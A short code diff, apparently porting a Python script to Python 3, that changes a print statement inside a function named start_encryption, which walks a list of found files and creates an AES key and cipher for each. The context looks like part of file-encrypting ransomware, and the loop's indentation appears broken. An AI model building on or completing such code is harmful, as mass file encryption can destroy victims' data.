@@ -48,7 +48,7 @@ def encrypt_priv_key(msg, key):
 def start_encryption(files):
     AES_and_base64_path = []
     for x in range(len(files)):
-    print files[x],
+    print(files[x]),
     for found_file in files:
         key = generate_keys.generate_key(128, True)
         AES_obj = symmetric.AESCipher(key)
